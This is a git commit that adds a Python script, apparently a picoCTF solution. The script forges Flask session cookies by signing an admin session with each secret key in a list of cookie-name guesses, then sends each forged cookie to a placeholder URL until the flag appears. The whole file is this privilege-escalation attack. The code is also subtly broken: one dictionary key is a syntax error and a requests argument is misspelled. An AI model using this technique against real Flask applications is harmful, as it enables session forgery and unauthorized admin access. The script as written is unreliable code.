c06d94e3dbd206309da5f116ee5c6230d0ef824a
Mostafa Wael <103769962+MostaWael@users.noreply.github.com>
2024-01-06 12:14:06 +0200

    Create main.py

---
+++ main.py
@@ -0,0 +1,42 @@
+#!/usr/bin/env python
+import requests
+from flask.sessions import SecureCookieSessionInterface
+from itsdangerous import URLSafeTimedSerializer
+
+class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
+	# Override method
+	# Take secret_key instead of an instance of a Flask app
+	def get_signing_serializer(self, secret_key):
+		if not secret_key:
+			return None
+		signer_kwargs = dict(
+			key_derivation=self.key_derivation,
+			digest_method=self.digest_method
+		)
+		return URLSafeTimedSerializer(secret_key, salt=self.salt,
+		                              serializer=self.serializer,
+		                              signer_kwargs=signer_kwargs)
+
+def decodeFlaskCookie(secret_key, cookieValue):
+	sscsi = SimpleSecureCookieSessionInterface()
+	signingSerializer = sscsi.get_signing_serializer(secret_key)
+	return signingSerializer.loads(cookieValue)
+
+# Keep in mind that flask uses unicode strings for the
+# dictionary keys
+def encodeFlaskCookie(secret_key, cookieDict):
+	sscsi = SimpleSecureCookieSessionInterface()
+	signingSerializer = sscsi.get_signing_serializer(secret_key)
+	return signingSerializer.dumps(cookieDict)
+#ypu can update this list depending in your own
+cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel","wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
+
+for name in cookie_names:
+	session = {}
+	session[""very_auth]="admin"
+	print(name)
+	cookie= encodeFlaskCookie(name, session)
+	r = requests.get("URL", cookies={"session":cookie}, allow_redirect=False)
+	if "picoCTF" in r.text:
+		print(r.text)
+		break
